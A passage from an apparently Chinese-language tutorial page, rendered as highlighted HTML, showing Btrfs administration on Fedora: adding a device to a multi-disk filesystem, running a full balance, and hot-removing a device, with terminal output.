<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  └─fedora_localhost--live-root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 253:0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   49G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lvm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  /</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvme0n2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                         259:4</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   20G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /mnt</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvme0n3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                         259:5</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   20G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvme0n4</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                         259:6</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   20G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvme0n5</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                         259:7</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   20G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvme0n6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                         259:8</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   20G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disk</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> show</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Label:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'mydata'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  uuid:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 92aac6fd-d7c5-4ac3-9ba6-acbe13071611</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Total</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> devices</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 144.00KiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 272.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 264.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n3</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs device add /dev/nvme0n4 /mnt/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> show</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Label:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'mydata'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  uuid:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 92aac6fd-d7c5-4ac3-9ba6-acbe13071611</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Total</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> devices</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 144.00KiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 272.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 264.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n3</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0.00B</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n4</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# df -h</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Filesystem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                               Size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  Used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Avail</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Use%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Mounted</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">devtmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                 4.0M</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  4.0M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   0%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    1.9G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   0%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/shm</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    777M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.7M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  775M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /run</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/mapper/fedora_localhost--live-root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   48G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  4.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   41G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  11%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    1.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   16K</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /tmp</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/nvme0n1p2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                           974M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  243M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  664M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  27%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /boot</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                    389M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   88K</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  389M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /run/user/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/nvme0n2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                              57G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  3.8M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   57G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   1%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /mnt</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>均衡数据（热）</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">添加新磁盘后数据不均匀</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs filesystem show /mnt/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Label:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'mydata'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  uuid:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 92aac6fd-d7c5-4ac3-9ba6-acbe13071611</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Total</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> devices</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 144.00KiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 272.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 264.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n3</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0.00B</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n4</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs balance start /mnt/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">WARNING:</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Full</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> balance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> without</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> filters</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> requested.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> This</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> operation</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ve</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                           ry</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        intense</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> and</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> takes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> potentially</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> very</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> long.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> It</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> recommended</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                           o</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        use</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> balance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> filters</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> narrow</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> down</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> balance.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Use</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'btrfs balance start --full-balance'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> option</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> skip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> this</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        warning.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> The</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> operation</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> will</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> start</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> in</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> seconds.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Use</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Ctrl-C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> stop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> it.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">10</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 9</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 8</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 7</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 6</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 5</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Starting</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> balance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> without</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> any</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> filters.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Done,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> had</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> relocate</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> chunks</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs filesystem show /mnt/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Label:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'mydata'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  uuid:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 92aac6fd-d7c5-4ac3-9ba6-acbe13071611</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Total</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> devices</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 144.00KiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0.00B</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 288.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n3</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1.28GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n4</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>移除设备(热)</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs filesystem show /mnt/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Label:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'mydata'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  uuid:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 92aac6fd-d7c5-4ac3-9ba6-acbe13071611</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Total</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> devices</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 144.00KiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0.00B</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 288.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n3</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1.28GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n4</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs device delete /dev/nvme0n4 /mnt/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs filesystem show /mnt/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Label:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'mydata'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  uuid:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 92aac6fd-d7c5-4ac3-9ba6-acbe13071611</span></span>
